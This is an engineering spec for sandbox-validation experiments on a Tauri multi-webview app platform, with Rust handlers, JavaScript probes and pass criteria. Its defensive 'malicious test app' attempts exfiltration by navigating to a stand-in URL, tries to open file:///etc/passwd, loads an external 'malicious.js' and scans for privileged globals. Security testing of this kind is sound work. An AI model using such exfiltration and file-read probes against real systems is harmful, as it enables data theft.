# Phase 0: Gating Spikes Specification

## Overview

This document defines the gating experiments that MUST pass before proceeding with full Post-Urbit frontend implementation. These spikes validate fundamental architectural assumptions about Tauri multi-webview sandboxing, custom protocol behavior, and IPC feasibility.

### Purpose

Phase 0 answers the question: **Can we build a secure, sandboxed app platform on Tauri?**

If any CRITICAL spike fails without a viable fallback, the architecture must be reconsidered before investing in full implementation.

### Go/No-Go Decision

After completing all spikes, the team will have:
1. **Definitive data** on custom scheme behavior across all platforms
2. **Verified isolation** between apps at the origin/storage level
3. **Proven CSP enforcement** via custom protocol headers
4. **Confirmed sandbox containment** preventing Tauri API access
5. **Chosen IPC primitive** (MessagePort or Rust-mediated fallback)
6. **Baseline memory numbers** for resource planning

---

## Spike Summary Table

| Spike | Name | Question | Critical? | Dependencies |
|-------|------|----------|-----------|--------------|
| 0.1 | Custom Scheme Secure Context | Is `postapp://` a secure context with working storage? | CRITICAL | None |
| 0.2 | Per-App Origin Isolation | Are apps isolated by origin with separate storage? | CRITICAL | 0.1 |
| 0.3 | CSP Enforcement via Custom Protocol | Can we inject and enforce CSP headers? | CRITICAL | 0.1 |
| 0.4 | Sandbox Containment Proof | Can apps be prevented from accessing Tauri APIs? | CRITICAL | 0.1, 0.3 |
| 0.5 | IPC Primitive Feasibility | Can we establish secure IPC channels? | HIGH | 0.1 |
| 0.6 | Multi-Webview Memory Baseline | What is the memory overhead per webview? | MEDIUM | 0.1 |
| 0.7 | Crash Containment (Optional) | Does a webview crash isolate from shell? | OPTIONAL | 0.1 |

---

## Execution Order

Execute spikes in this order (dependency-aware):

```
Phase 0.1 (Foundation)
    └── Custom Scheme Secure Context ─────┬──────────────────────────┐
                                          │                          │
Phase 0.2 (Isolation)                     ▼                          │
    └── Per-App Origin Isolation ◄───── requires 0.1                 │
                                          │                          │
Phase 0.3 (CSP)                           │                          │
    └── CSP Enforcement ◄────────────────requires 0.1                │
                                          │                          │
Phase 0.4 (Sandbox)                       ▼                          │
    └── Sandbox Containment ◄──────── requires 0.1 + 0.3             │
                                          │                          │
Phase 0.5 (IPC)                           │                          ▼
    └── IPC Primitive Feasibility ◄───── requires 0.1 ─────► can run parallel
                                          │
Phase 0.6 (Memory)                        │
    └── Memory Baseline ◄────────────────requires 0.1 ─────► run after IPC choice
                                          │
Phase 0.7 (Optional)                      │
    └── Crash Containment ◄──────────────requires 0.1
```

**Rationale:**
1. Spike 0.1 tests the fundamental assumption that custom schemes work as origins
2. If 0.1 fails, all subsequent spikes are moot
3. Spikes 0.2 and 0.3 can run in parallel after 0.1 passes
4. Spike 0.4 requires CSP to be working for accurate containment testing
5. Spike 0.5 can run in parallel but informs final architecture
6. Spike 0.6 should run last with the actual configuration choices

---

## Platform Test Matrix

All spikes MUST be tested on all three platforms:

| Platform | WebView Engine | Version to Test | Notes |
|----------|----------------|-----------------|-------|
| Windows | WebView2 (Edge) | Latest stable | Chromium-based |
| macOS | WKWebView | macOS 13+ | WebKit-based |
| Linux | WebKitGTK | 2.42+ | WebKit-based |

### Version Recording

Each spike result MUST record:
```json
{
  "platform": "windows|macos|linux",
  "os_version": "Windows 11 23H2|macOS 14.2|Ubuntu 24.04",
  "webview_engine": "WebView2|WKWebView|WebKitGTK",
  "webview_version": "120.0.2210.91|18616|2.42.4",
  "tauri_version": "2.0.0",
  "test_date": "2026-01-20T12:00:00Z"
}
```

---

## Spike 0.1: Custom Scheme Secure Context

### Question Being Answered

Is `postapp://app-id/...` treated as a **Secure Context** by the webview, with working `crypto.subtle`, `IndexedDB`, and `localStorage`?

### Why Critical

If the custom scheme is not a Secure Context:
- `crypto.subtle` (Web Crypto API) will be unavailable
- IndexedDB may fail or behave unexpectedly
- localStorage may be unavailable or shared
- Service Workers will not register
- Many modern web APIs require Secure Context

**FAIL CONSEQUENCE:** Must abandon `postapp://` scheme and use alternative (loopback HTTP, `tauri://` asset protocol, or virtual host mapping).

### Experiment Design

#### Step 1: Create Minimal Tauri App

```rust
// src-tauri/src/main.rs
use tauri::http::{Request, Response, ResponseBuilder};

fn main() {
    tauri::Builder::default()
        .register_uri_scheme_protocol("postapp", |_app, request| {
            handle_postapp_request(request)
        })
        .run(tauri::generate_context!())
        .expect("error running app");
}

fn handle_postapp_request(request: &Request) -> Response {
    let uri = request.uri();
    let host = uri.host().unwrap_or("unknown");
    let path = uri.path();
    let path = if path == "/" { "/index.html" } else { path };

    // Serve test files from embedded assets
    let content = get_test_asset(host, path);
    let mime = mime_guess::from_path(path)
        .first_or_octet_stream()
        .to_string();

    ResponseBuilder::new()
        .status(200)
        .header("Content-Type", mime)
        .header("X-Content-Type-Options", "nosniff")
        .body(content)
        .unwrap()
}
```

#### Step 2: Create Test Page

```html
<!-- test-assets/secure-context-test/index.html -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Secure Context Test</title>
</head>
<body>
    <h1>Secure Context Spike 0.1</h1>
    <pre id="output"></pre>
    <script src="./probe.js"></script>
</body>
</html>
```

```javascript
// test-assets/secure-context-test/probe.js
(async function runProbes() {
    const results = {
        spike: "0.1",
        name: "secure_context",
        timestamp: new Date().toISOString(),
        location: {
            href: window.location.href,
            origin: window.location.origin,
            protocol: window.location.protocol,
            host: window.location.host
        },
        probes: {}
    };

    // Probe 1: isSecureContext
    results.probes.is_secure_context = {
        value: window.isSecureContext,
        pass: window.isSecureContext === true
    };

    // Probe 2: crypto.subtle availability
    results.probes.crypto_subtle_exists = {
        value: typeof window.crypto?.subtle !== 'undefined',
        pass: typeof window.crypto?.subtle !== 'undefined'
    };

    // Probe 3: crypto.subtle.generateKey works
    try {
        const key = await window.crypto.subtle.generateKey(
            { name: "AES-GCM", length: 256 },
            true,
            ["encrypt", "decrypt"]
        );
        results.probes.crypto_subtle_works = {
            value: key !== null && key !== undefined,
            pass: true,
            key_type: key?.type
        };
    } catch (e) {
        results.probes.crypto_subtle_works = {
            value: false,
            pass: false,
            error: e.message
        };
    }

    // Probe 4: IndexedDB availability
    results.probes.indexeddb_exists = {
        value: typeof window.indexedDB !== 'undefined',
        pass: typeof window.indexedDB !== 'undefined'
    };

    // Probe 5: IndexedDB open works
    try {
        const dbPromise = new Promise((resolve, reject) => {
            const request = indexedDB.open("spike_test_db", 1);
            request.onerror = () => reject(request.error);
            request.onsuccess = () => {
                const db = request.result;
                db.close();
                resolve(true);
            };
            request.onupgradeneeded = (event) => {
                const db = event.target.result;
                db.createObjectStore("test_store", { keyPath: "id" });
            };
        });
        const dbOpened = await dbPromise;
        results.probes.indexeddb_works = {
            value: dbOpened,
            pass: true
        };
    } catch (e) {
        results.probes.indexeddb_works = {
            value: false,
            pass: false,
            error: e.message
        };
    }

    // Probe 6: IndexedDB persistence (write then read)
    try {
        const testKey = `test_${Date.now()}`;
        const testValue = crypto.randomUUID();

        const db = await new Promise((resolve, reject) => {
            const req = indexedDB.open("spike_persistence_test", 1);
            req.onerror = () => reject(req.error);
            req.onsuccess = () => resolve(req.result);
            req.onupgradeneeded = (e) => {
                e.target.result.createObjectStore("store", { keyPath: "key" });
            };
        });

        // Write
        await new Promise((resolve, reject) => {
            const tx = db.transaction(["store"], "readwrite");
            tx.objectStore("store").put({ key: testKey, value: testValue });
            tx.oncomplete = resolve;
            tx.onerror = reject;
        });

        // Read back
        const readValue = await new Promise((resolve, reject) => {
            const tx = db.transaction(["store"], "readonly");
            const req = tx.objectStore("store").get(testKey);
            req.onsuccess = () => resolve(req.result?.value);
            req.onerror = reject;
        });

        db.close();

        results.probes.indexeddb_persistence = {
            value: readValue === testValue,
            pass: readValue === testValue,
            wrote: testValue,
            read: readValue
        };
    } catch (e) {
        results.probes.indexeddb_persistence = {
            value: false,
            pass: false,
            error: e.message
        };
    }

    // Probe 7: localStorage availability
    results.probes.localstorage_exists = {
        value: typeof window.localStorage !== 'undefined',
        pass: typeof window.localStorage !== 'undefined'
    };

    // Probe 8: localStorage read/write works
    try {
        const testKey = `spike_test_${Date.now()}`;
        const testValue = crypto.randomUUID();
        localStorage.setItem(testKey, testValue);
        const readValue = localStorage.getItem(testKey);
        localStorage.removeItem(testKey);

        results.probes.localstorage_works = {
            value: readValue === testValue,
            pass: readValue === testValue
        };
    } catch (e) {
        results.probes.localstorage_works = {
            value: false,
            pass: false,
            error: e.message
        };
    }

    // Probe 9: CacheStorage (optional, may not work)
    try {
        const cache = await caches.open('spike_test');
        await cache.put('/test', new Response('test'));
        const response = await cache.match('/test');
        const text = await response?.text();
        await caches.delete('spike_test');

        results.probes.cache_storage = {
            value: text === 'test',
            pass: text === 'test',
            optional: true
        };
    } catch (e) {
        results.probes.cache_storage = {
            value: false,
            pass: false,
            error: e.message,
            optional: true
        };
    }

    // Calculate overall result
    const requiredProbes = [
        'is_secure_context',
        'crypto_subtle_exists',
        'crypto_subtle_works',
        'indexeddb_exists',
        'indexeddb_works',
        'indexeddb_persistence',
        'localstorage_exists',
        'localstorage_works'
    ];

    results.overall_pass = requiredProbes.every(
        probe => results.probes[probe]?.pass === true
    );
    results.required_passed = requiredProbes.filter(
        probe => results.probes[probe]?.pass === true
    ).length;
    results.required_total = requiredProbes.length;

    // Output result for Rust to capture
    console.log("SPIKE_RESULT_START");
    console.log(JSON.stringify(results, null, 2));
    console.log("SPIKE_RESULT_END");

    // Also display in page
    document.getElementById('output').textContent =
        JSON.stringify(results, null, 2);
})();
```

### Pass Criteria (Machine-Verifiable)

```json
{
  "spike": "0.1",
  "pass_criteria": {
    "is_secure_context": {
      "condition": "value === true",
      "required": true
    },
    "crypto_subtle_exists": {
      "condition": "value === true",
      "required": true
    },
    "crypto_subtle_works": {
      "condition": "pass === true",
      "required": true
    },
    "indexeddb_exists": {
      "condition": "value === true",
      "required": true
    },
    "indexeddb_works": {
      "condition": "pass === true",
      "required": true
    },
    "indexeddb_persistence": {
      "condition": "pass === true",
      "required": true
    },
    "localstorage_exists": {
      "condition": "value === true",
      "required": true
    },
    "localstorage_works": {
      "condition": "pass === true",
      "required": true
    },
    "cache_storage": {
      "condition": "pass === true",
      "required": false,
      "note": "Nice to have but not blocking"
    }
  },
  "overall_pass_condition": "all required probes pass on all 3 platforms"
}
```

### Fail Path

If Spike 0.1 FAILS:

1. **Document which specific probes failed** on which platforms
2. **Try alternative approaches:**
   - Use `tauri://localhost/` asset protocol instead
   - Use loopback HTTP server (`http://127.0.0.1:{port}/`)
   - Use virtual host mapping if supported
3. **Re-run Spike 0.1 with alternative** to confirm it works
4. **Update all subsequent specs** to use the working approach
5. **If no approach works**: STOP - architecture is not viable

### Dependencies

- None (this is the first spike)

---

## Spike 0.2: Per-App Origin Isolation

### Question Being Answered

Does `postapp://app-a/...` have a **different origin** than `postapp://app-b/...`, and does each app get **isolated storage** (IndexedDB, localStorage)?

### Why Critical

If apps share storage:
- App A can read App B's private data
- App A can corrupt App B's state
- No data isolation between apps
- Security model is fundamentally broken

**FAIL CONSEQUENCE:** Must implement additional storage partitioning at the Rust layer, or abandon custom scheme.

### Experiment Design

#### Step 1: Load Two App Webviews

```rust
// Create two webviews with different origins
let webview_a = WebviewBuilder::new("app-a", "postapp://app-a/index.html")?
    .build()?;
let webview_b = WebviewBuilder::new("app-b", "postapp://app-b/index.html")?
    .build()?;

window.add_child(webview_a, ...)?;
window.add_child(webview_b, ...)?;
```

#### Step 2: Test Page for Each App

```javascript
// test-assets/origin-isolation-test/probe.js
(async function runOriginIsolationProbes() {
    const results = {
        spike: "0.2",
        name: "origin_isolation",
        timestamp: new Date().toISOString(),
        app_id: window.location.host, // e.g., "app-a" or "app-b"
        origin: window.location.origin,
        probes: {}
    };

    // Shared test key used by both apps
    const SHARED_KEY = "spike_0_2_isolation_test";
    const MY_VALUE = `written_by_${window.location.host}_${Date.now()}`;

    // Probe 1: Check origin format
    results.probes.origin_format = {
        value: window.location.origin,
        expected_pattern: "postapp://<app-id>",
        pass: window.location.origin.startsWith("postapp://")
    };

    // Probe 2: Write to localStorage
    try {
        localStorage.setItem(SHARED_KEY, MY_VALUE);
        results.probes.localstorage_write = {
            value: MY_VALUE,
            pass: true
        };
    } catch (e) {
        results.probes.localstorage_write = {
            value: null,
            pass: false,
            error: e.message
        };
    }

    // Probe 3: Read localStorage (should see own value only)
    try {
        const readValue = localStorage.getItem(SHARED_KEY);
        results.probes.localstorage_read = {
            value: readValue,
            expected: MY_VALUE,
            pass: readValue === MY_VALUE,
            contains_other_app: readValue && !readValue.includes(window.location.host)
        };
    } catch (e) {
        results.probes.localstorage_read = {
            value: null,
            pass: false,
            error: e.message
        };
    }

    // Probe 4: Write to IndexedDB
    try {
        const db = await new Promise((resolve, reject) => {
            const req = indexedDB.open("isolation_test_db", 1);
            req.onerror = () => reject(req.error);
            req.onsuccess = () => resolve(req.result);
            req.onupgradeneeded = (e) => {
                e.target.result.createObjectStore("store", { keyPath: "key" });
            };
        });

        await new Promise((resolve, reject) => {
            const tx = db.transaction(["store"], "readwrite");
            tx.objectStore("store").put({ key: SHARED_KEY, value: MY_VALUE, app: window.location.host });
            tx.oncomplete = resolve;
            tx.onerror = reject;
        });

        results.probes.indexeddb_write = {
            value: MY_VALUE,
            pass: true
        };

        // Read back
        const readResult = await new Promise((resolve, reject) => {
            const tx = db.transaction(["store"], "readonly");
            const req = tx.objectStore("store").get(SHARED_KEY);
            req.onsuccess = () => resolve(req.result);
            req.onerror = reject;
        });

        db.close();

        results.probes.indexeddb_read = {
            value: readResult?.value,
            app_that_wrote: readResult?.app,
            expected: MY_VALUE,
            pass: readResult?.value === MY_VALUE && readResult?.app === window.location.host
        };
    } catch (e) {
        results.probes.indexeddb_write = { value: null, pass: false, error: e.message };
        results.probes.indexeddb_read = { value: null, pass: false, error: e.message };
    }

    // Overall pass (per-app - cross-validation done in Rust)
    results.probes_all_pass = [
        'origin_format',
        'localstorage_write',
        'localstorage_read',
        'indexeddb_write',
        'indexeddb_read'
    ].every(p => results.probes[p]?.pass === true);

    console.log("SPIKE_RESULT_START");
    console.log(JSON.stringify(results, null, 2));
    console.log("SPIKE_RESULT_END");

    document.getElementById('output').textContent = JSON.stringify(results, null, 2);
})();
```

### Pass Criteria (Machine-Verifiable)

```json
{
  "spike": "0.2",
  "pass_criteria": {
    "origins_different": {
      "condition": "app_a.origin !== app_b.origin",
      "required": true
    },
    "localstorage_isolated": {
      "condition": "app_a.localStorage[key] !== app_b.localStorage[key]",
      "required": true
    },
    "indexeddb_isolated": {
      "condition": "app_a cannot read app_b's IndexedDB records",
      "required": true
    },
    "no_cross_visibility": {
      "condition": "neither app sees the other's written values",
      "required": true
    }
  },
  "overall_pass_condition": "all 4 checks pass on all 3 platforms"
}
```

### Fail Path

If Spike 0.2 FAILS:

1. **Document which isolation check failed**
2. **Investigate platform-specific behavior:**
   - Some platforms may partition by scheme only, not host
   - Check if opaque origin handling differs
3. **Mitigation options:**
   - Add app ID prefix to all storage keys at SDK level
   - Use separate user data directories per app (WebView2)
   - Implement storage virtualization in Rust
4. **If mitigation works**: Document and continue
5. **If no mitigation**: This is a CRITICAL failure

### Dependencies

- Spike 0.1 must pass (custom scheme must work as origin)

---

## Spike 0.3: CSP Enforcement via Custom Protocol

### Question Being Answered

Can we inject CSP headers via the custom protocol handler, and are they **enforced** by the webview to block:
- External script loading
- External fetch/XHR
- Inline script execution (if configured)
- eval() execution

### Why Critical

CSP is the primary defense against:
- Data exfiltration via network requests
- Script injection attacks
- Loading malicious external resources

**FAIL CONSEQUENCE:** Must implement CSP enforcement differently (meta tag, webview config), or add additional defenses.

### Experiment Design

#### Step 1: Protocol Handler with CSP

```rust
fn handle_postapp_request(request: &Request) -> Response {
    let uri = request.uri();
    let host = uri.host().unwrap_or("unknown");
    let path = uri.path();

    let content = get_test_asset(host, path);
    let mime = mime_guess::from_path(path).first_or_octet_stream().to_string();

    // Strict CSP for testing
    let csp = format!(
        "default-src 'none'; \
         script-src 'self' postapp://{host}; \
         style-src 'self' 'unsafe-inline' postapp://{host}; \
         img-src 'self' data: blob: postapp://{host}; \
         connect-src 'none'; \
         frame-ancestors 'none'; \
         form-action 'none'; \
         base-uri 'none'"
    );

    ResponseBuilder::new()
        .status(200)
        .header("Content-Type", mime)
        .header("Content-Security-Policy", csp)
        .header("X-Content-Type-Options", "nosniff")
        .header("Referrer-Policy", "no-referrer")
        .body(content)
        .unwrap()
}
```

#### Step 2: Test Page with CSP Violation Listener

```javascript
// test-assets/csp-test/probe.js
(async function runCspProbes() {
    const results = {
        spike: "0.3",
        name: "csp_enforcement",
        timestamp: new Date().toISOString(),
        origin: window.location.origin,
        probes: {},
        violations: []
    };

    // Collect all CSP violations
    window.addEventListener('securitypolicyviolation', (event) => {
        results.violations.push({
            directive: event.violatedDirective,
            blocked_uri: event.blockedURI,
            source_file: event.sourceFile,
            line: event.lineNumber
        });
    });

    // Wait a bit for any violations to be captured
    await new Promise(resolve => setTimeout(resolve, 100));

    // Probe 1: Try to load external script (should be blocked)
    const externalScriptPromise = new Promise((resolve) => {
        const script = document.createElement('script');
        script.src = 'https://example.com/malicious.js';
        script.onload = () => resolve({ loaded: true });
        script.onerror = () => resolve({ loaded: false });
        document.head.appendChild(script);
        setTimeout(() => resolve({ loaded: false, timeout: true }), 2000);
    });
    const externalScriptResult = await externalScriptPromise;
    results.probes.external_script_blocked = {
        value: !externalScriptResult.loaded,
        pass: !externalScriptResult.loaded,
        details: externalScriptResult
    };

    // Probe 2: Try fetch to external URL (should be blocked)
    try {
        const response = await fetch('https://example.com/api/data');
        results.probes.external_fetch_blocked = {
            value: false,
            pass: false,
            error: "Fetch succeeded when it should have been blocked"
        };
    } catch (e) {
        results.probes.external_fetch_blocked = {
            value: true,
            pass: true,
            error_type: e.name
        };
    }

    // Probe 3: Try XMLHttpRequest to external URL (should be blocked)
    const xhrResult = await new Promise((resolve) => {
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://httpbin.org/get', true);
            xhr.onload = () => resolve({ blocked: false });
            xhr.onerror = () => resolve({ blocked: true });
            xhr.send();
            setTimeout(() => resolve({ blocked: true, timeout: true }), 3000);
        } catch (e) {
            resolve({ blocked: true, error: e.message });
        }
    });
    results.probes.external_xhr_blocked = {
        value: xhrResult.blocked,
        pass: xhrResult.blocked,
        details: xhrResult
    };

    // Probe 4: Try WebSocket to external (should be blocked by connect-src)
    const wsResult = await new Promise((resolve) => {
        try {
            const ws = new WebSocket('wss://echo.websocket.org');
            ws.onopen = () => {
                ws.close();
                resolve({ blocked: false });
            };
            ws.onerror = () => resolve({ blocked: true });
            setTimeout(() => {
                ws.close();
                resolve({ blocked: true, timeout: true });
            }, 3000);
        } catch (e) {
            resolve({ blocked: true, error: e.message });
        }
    });
    results.probes.websocket_blocked = {
        value: wsResult.blocked,
        pass: wsResult.blocked,
        details: wsResult
    };

    // Check violation count (should have captured some)
    await new Promise(resolve => setTimeout(resolve, 500));
    results.probes.violations_captured = {
        value: results.violations.length,
        pass: results.violations.length >= 3,
        violations: results.violations
    };

    // Calculate overall pass
    const requiredProbes = [
        'external_script_blocked',
        'external_fetch_blocked',
        'external_xhr_blocked',
        'websocket_blocked'
    ];
    results.overall_pass = requiredProbes.every(
        probe => results.probes[probe]?.pass === true
    );
    results.required_passed = requiredProbes.filter(
        probe => results.probes[probe]?.pass === true
    ).length;
    results.required_total = requiredProbes.length;

    console.log("SPIKE_RESULT_START");
    console.log(JSON.stringify(results, null, 2));
    console.log("SPIKE_RESULT_END");

    document.getElementById('output').textContent = JSON.stringify(results, null, 2);
})();
```

### Pass Criteria (Machine-Verifiable)

```json
{
  "spike": "0.3",
  "pass_criteria": {
    "external_script_blocked": {
      "condition": "script.onload never fires, script.onerror fires",
      "required": true
    },
    "external_fetch_blocked": {
      "condition": "fetch() throws or returns network error",
      "required": true
    },
    "external_xhr_blocked": {
      "condition": "xhr.onerror fires, xhr.onload never fires",
      "required": true
    },
    "websocket_blocked": {
      "condition": "WebSocket onerror fires or constructor throws",
      "required": true
    }
  },
  "overall_pass_condition": "all 4 required probes pass on all 3 platforms"
}
```

### Fail Path

If Spike 0.3 FAILS:

1. **Identify which platform(s) failed**
2. **Check if CSP header was actually sent** (Rust logging)
3. **Try alternative CSP delivery:**
   - `<meta http-equiv="Content-Security-Policy">` tag
   - Webview-level configuration (if available)
4. **Document platform-specific CSP behavior**
5. **If CSP cannot be enforced**: This is a CRITICAL failure

### Dependencies

- Spike 0.1 must pass (custom scheme must work)

---

## Spike 0.4: Sandbox Containment Proof

### Question Being Answered

Can untrusted app webviews be prevented from:
1. Accessing `__TAURI__` and related globals
2. Calling `invoke()` or other Tauri APIs
3. Navigating to external URLs
4. Opening popup windows
5. Accessing any privileged browser/OS APIs

### Why Critical

This is the **core security boundary**. If apps can escape the sandbox:
- They can read/write any file on disk
- They can execute arbitrary commands
- They can access other apps' data
- The entire security model collapses

**FAIL CONSEQUENCE:** STOP - architecture is fundamentally insecure.

### Experiment Design

#### Step 1: Create Untrusted Webview WITHOUT Tauri APIs

```rust
fn create_untrusted_webview(window: &Window, app_id: &str) -> Result<Webview> {
    let webview = WebviewBuilder::new(
        &format!("app-{}", app_id),
        WebviewUrl::External(format!("postapp://{}/index.html", app_id).parse()?)
    )
    // CRITICAL: Disable Tauri API injection
    .disable_tauri_api()  // If available
    .with_initialization_script("") // No Tauri init script
    .build()?;

    // CRITICAL: Set up navigation handler to block external URLs
    webview.on_navigation(|url| {
        let allowed = url.scheme() == "postapp" &&
                      url.host_str() == Some(app_id);
        if !allowed {
            log::warn!("Blocked navigation to: {}", url);
        }
        allowed
    });

    // CRITICAL: Block new window creation
    webview.on_new_window_request(|_url| {
        log::warn!("Blocked new window request");
        false
    });

    Ok(webview)
}
```

#### Step 2: Malicious Test App

```javascript
// test-assets/malicious-app/probe.js
(async function runContainmentProbes() {
    const results = {
        spike: "0.4",
        name: "sandbox_containment",
        timestamp: new Date().toISOString(),
        origin: window.location.origin,
        probes: {},
        escape_attempts: []
    };

    function recordAttempt(name, success, details = {}) {
        results.escape_attempts.push({
            name,
            success,
            timestamp: new Date().toISOString(),
            ...details
        });
        return success;
    }

    // ==================== TAURI GLOBAL CHECKS ====================

    // Probe 1: Check for __TAURI__ global
    results.probes.tauri_global_absent = {
        value: typeof window.__TAURI__ === 'undefined',
        pass: typeof window.__TAURI__ === 'undefined',
        found: typeof window.__TAURI__
    };
    recordAttempt('access_tauri_global', typeof window.__TAURI__ !== 'undefined');

    // Probe 2: Check for __TAURI_INTERNALS__
    results.probes.tauri_internals_absent = {
        value: typeof window.__TAURI_INTERNALS__ === 'undefined',
        pass: typeof window.__TAURI_INTERNALS__ === 'undefined',
        found: typeof window.__TAURI_INTERNALS__
    };
    recordAttempt('access_tauri_internals', typeof window.__TAURI_INTERNALS__ !== 'undefined');

    // Probe 3: Try to call invoke if it exists
    let invokeWorked = false;
    try {
        if (window.__TAURI__?.invoke) {
            await window.__TAURI__.invoke('some_command');
            invokeWorked = true;
        } else if (window.__TAURI_INTERNALS__?.invoke) {
            await window.__TAURI_INTERNALS__.invoke('some_command');
            invokeWorked = true;
        }
    } catch (e) {
        // Expected to fail or not exist
    }
    results.probes.invoke_blocked = {
        value: !invokeWorked,
        pass: !invokeWorked,
        attempted: true
    };
    recordAttempt('invoke_command', invokeWorked);

    // ==================== NAVIGATION ESCAPE ATTEMPTS ====================

    // Probe 4: Try to navigate to external URL
    let navigationBlocked = false;
    const originalHref = window.location.href;
    try {
        window.location.href = 'https://example.com/exfiltrate?data=sensitive';
        await new Promise(resolve => setTimeout(resolve, 100));
        navigationBlocked = window.location.href === originalHref ||
                           window.location.href.startsWith('postapp://');
    } catch (e) {
        navigationBlocked = true;
    }
    results.probes.external_navigation_blocked = {
        value: navigationBlocked,
        pass: navigationBlocked,
        original_href: originalHref,
        final_href: window.location.href
    };
    recordAttempt('navigate_external', !navigationBlocked);

    // Probe 5: Try file:// navigation
    let fileNavBlocked = true;
    try {
        window.location.href = 'file:///etc/passwd';
        await new Promise(resolve => setTimeout(resolve, 100));
        fileNavBlocked = window.location.href.startsWith('postapp://');
    } catch (e) {
        fileNavBlocked = true;
    }
    results.probes.file_navigation_blocked = {
        value: fileNavBlocked,
        pass: fileNavBlocked
    };
    recordAttempt('navigate_file', !fileNavBlocked);

    // ==================== POPUP/NEW WINDOW ATTEMPTS ====================

    // Probe 6: Try window.open
    let popupBlocked = true;
    try {
        const popup = window.open('https://example.com', '_blank');
        popupBlocked = popup === null || popup === undefined;
        if (popup) popup.close();
    } catch (e) {
        popupBlocked = true;
    }
    results.probes.popup_blocked = {
        value: popupBlocked,
        pass: popupBlocked
    };
    recordAttempt('window_open', !popupBlocked);

    // ==================== ENUMERATE SUSPICIOUS GLOBALS ====================

    // Probe 7: Scan for suspicious globals
    const suspiciousGlobals = [
        '__TAURI__', '__TAURI_INTERNALS__', '__TAURI_IPC__',
        'ipc', 'electron', 'nodeRequire', 'require',
        'process', '__dirname', '__filename', 'Buffer'
    ];
    const foundSuspicious = suspiciousGlobals.filter(g => typeof window[g] !== 'undefined');
    results.probes.no_suspicious_globals = {
        value: foundSuspicious.length === 0,
        pass: foundSuspicious.length === 0,
        found: foundSuspicious
    };

    // ==================== CALCULATE OVERALL ====================

    const criticalProbes = [
        'tauri_global_absent',
        'tauri_internals_absent',
        'invoke_blocked',
        'external_navigation_blocked',
        'file_navigation_blocked',
        'popup_blocked',
        'no_suspicious_globals'
    ];

    results.overall_pass = criticalProbes.every(
        probe => results.probes[probe]?.pass === true
    );
    results.critical_passed = criticalProbes.filter(
        probe => results.probes[probe]?.pass === true
    ).length;
    results.critical_total = criticalProbes.length;

    results.successful_escapes = results.escape_attempts.filter(a => a.success).length;

    console.log("SPIKE_RESULT_START");
    console.log(JSON.stringify(results, null, 2));
    console.log("SPIKE_RESULT_END");

    document.getElementById('output').textContent = JSON.stringify(results, null, 2);
})();
```

### Pass Criteria (Machine-Verifiable)

```json
{
  "spike": "0.4",
  "pass_criteria": {
    "tauri_global_absent": {
      "condition": "typeof window.__TAURI__ === 'undefined'",
      "required": true
    },
    "tauri_internals_absent": {
      "condition": "typeof window.__TAURI_INTERNALS__ === 'undefined'",
      "required": true
    },
    "invoke_blocked": {
      "condition": "invoke() throws or does not exist",
      "required": true
    },
    "external_navigation_blocked": {
      "condition": "location.href = 'https://...' does not navigate",
      "required": true
    },
    "file_navigation_blocked": {
      "condition": "location.href = 'file://...' does not navigate",
      "required": true
    },
    "popup_blocked": {
      "condition": "window.open() returns null",
      "required": true
    },
    "no_suspicious_globals": {
      "condition": "no node/electron/tauri globals found",
      "required": true
    },
    "successful_escapes": {
      "condition": "=== 0",
      "required": true
    }
  },
  "overall_pass_condition": "all 8 criteria pass AND successful_escapes === 0"
}
```

### Fail Path

If Spike 0.4 FAILS:

1. **THIS IS A CRITICAL FAILURE** - Do not proceed
2. **Identify which escape vectors succeeded**
3. **Investigate Tauri configuration:**
   - Check if API injection can be disabled
   - Check webview creation flags
   - Review Tauri version and capabilities
4. **Potential fixes:**
   - Use different webview creation method
   - File bug with Tauri project
   - Consider iframe-based isolation instead
5. **If no fix available**: Architecture is not viable - must redesign

### Dependencies

- Spike 0.1 must pass
- Spike 0.3 must pass (CSP adds additional containment)

---

## Spike 0.5: IPC Primitive Feasibility

### Question Being Answered

1. Can we transfer a `MessagePort` to an isolated webview for secure IPC?
2. If not, can Rust-mediated IPC meet our security and performance requirements?

### Why Critical

IPC is how apps communicate with the backend. Requirements:
- **Security**: Apps cannot spoof each other's identity
- **Performance**: < 50ms p95 latency for requests
- **Isolation**: No cross-app message interception
- **Reliability**: Ordered delivery, no message loss

**EXPECTED OUTCOME:** MessagePort transfer likely to FAIL for cross-webview. Fallback to Rust-mediated IPC.

### Pass Criteria (Machine-Verifiable)

```json
{
  "spike": "0.5",
  "pass_criteria": {
    "messageport_transfer": {
      "condition": "transfer works OR fallback viable",
      "required": false,
      "note": "Expected to fail, need viable fallback"
    },
    "rust_mediated_ipc_works": {
      "condition": "request/response round-trip succeeds",
      "required": true
    },
    "latency_p95": {
      "condition": "< 50ms",
      "required": true
    },
    "identity_bound": {
      "condition": "requests bound to webview label, cannot spoof",
      "required": true
    },
    "event_push_works": {
      "condition": "backend can push events to specific webview",
      "required": true
    }
  },
  "overall_pass_condition": "at least one IPC mechanism meets all requirements"
}
```

### Fail Path

If Spike 0.5 FAILS (both MessagePort AND Rust-mediated):

1. **Investigate why Rust-mediated IPC failed**
2. **Check if Tauri events work** (emit_to specific webview)
3. **Consider WebSocket-based IPC** as last resort
4. **If no IPC works**: Architecture needs iframe-based design

### Dependencies

- Spike 0.1 must pass

---

## Spike 0.6: Multi-Webview Memory Baseline

### Question Being Answered

What is the **actual memory overhead** of running N webviews, and what are the practical limits for concurrent apps?

### Why Critical

Memory constraints determine:
- Maximum concurrent apps
- LRU unloading thresholds
- System requirements documentation
- Feasibility of multi-webview vs iframe

**NOT A HARD BLOCKER** - But informs architecture decisions.

### Pass Criteria (Machine-Verifiable)

```json
{
  "spike": "0.6",
  "pass_criteria": {
    "five_webviews_under_2gb": {
      "condition": "total_rss_mb with 5 webviews < 2048",
      "required": true
    },
    "per_webview_overhead_reasonable": {
      "condition": "per_webview_overhead_mb < 400",
      "required": true,
      "note": "400MB is generous upper bound"
    },
    "creation_time_acceptable": {
      "condition": "creation_time_p95_ms < 3000",
      "required": true
    }
  },
  "overall_pass_condition": "all 3 criteria pass on all 3 platforms"
}
```

### Fail Path

If Spike 0.6 shows unacceptable memory usage:

1. **Document exact numbers per platform**
2. **Consider alternatives:**
   - iframe-based isolation (shared process)
   - Aggressive LRU unloading
   - Lazy webview creation
3. **Adjust system requirements** documentation
4. **This is NOT a hard blocker** - it informs design decisions

### Dependencies

- Spike 0.1 must pass

---

